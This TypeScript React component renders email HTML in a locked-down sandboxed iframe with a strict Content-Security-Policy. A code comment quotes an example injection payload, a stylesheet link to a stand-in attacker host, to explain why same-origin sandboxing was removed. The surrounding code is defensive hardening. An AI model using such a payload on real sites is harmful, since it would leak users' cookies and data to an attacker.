// SPDX-License-Identifier: AGPL-3.0-only
"use client";

import { useMemo } from "react";

import { cn } from "@/lib/utils";

export type PreviewMode = "desktop" | "mobile";
export type PreviewTheme = "light" | "dark";

interface PreviewPaneProps {
  html: string;
  mode: PreviewMode;
  theme: PreviewTheme;
  className?: string;
}

/**
 * Sandboxed iframe preview for compiled HTML. Dark mode is applied by
 * wrapping the document in a body[data-mode="dark"] selector and a
 * `prefers-color-scheme` media block — emails that respect either get
 * a faithful dark preview.
 *
 * Sandbox posture: `sandbox=""` (no flags) is fully restrictive — no
 * scripts, no same-origin, no forms, no top-nav. Email previews don't
 * need any of those. The previous `allow-same-origin` was a real XSS
 * vector: `<link rel="stylesheet" href="//attacker/leak">` in pasted
 * HTML would have fired with the parent origin's cookies attached.
 * (Server-side HTML sanitization is a separate follow-up.)
 */
export function PreviewPane({
  html,
  mode,
  theme,
  className,
}: PreviewPaneProps) {
  const srcDoc = useMemo(() => buildDocument(html, theme), [html, theme]);

  const widthClass = mode === "mobile" ? "w-[390px]" : "w-full max-w-[680px]";

  return (
    <div
      className={cn(
        "h-full w-full flex justify-center bg-muted/40 p-4 overflow-auto",
        className,
      )}
    >
      <iframe
        title="Email preview"
        sandbox=""
        referrerPolicy="no-referrer"
        srcDoc={srcDoc}
        className={cn(
          "border bg-white rounded-md shadow-sm h-[720px] transition-all",
          widthClass,
        )}
      />
    </div>
  );
}

function buildDocument(html: string, theme: PreviewTheme): string {
  const dataMode = theme === "dark" ? "dark" : "light";
  const csp =
    "default-src 'none'; img-src data: blob:; style-src 'unsafe-inline'; font-src data:; media-src 'none'; connect-src 'none'; frame-src 'none'; object-src 'none'; form-action 'none'; base-uri 'none'";
  const overlay =
    theme === "dark"
      ? `<style>html, body { background:#0b0b0c !important; } [data-mode="dark"] body, body[data-mode="dark"] { color-scheme: dark; } body { filter: none; }</style>`
      : "";
  const head = `<meta http-equiv="Content-Security-Policy" content="${csp}"><meta name="color-scheme" content="${dataMode}">${overlay}`;
  return `<!doctype html><html><head><meta charset="utf-8">${head}</head><body data-mode="${dataMode}">${html}</body></html>`;
}
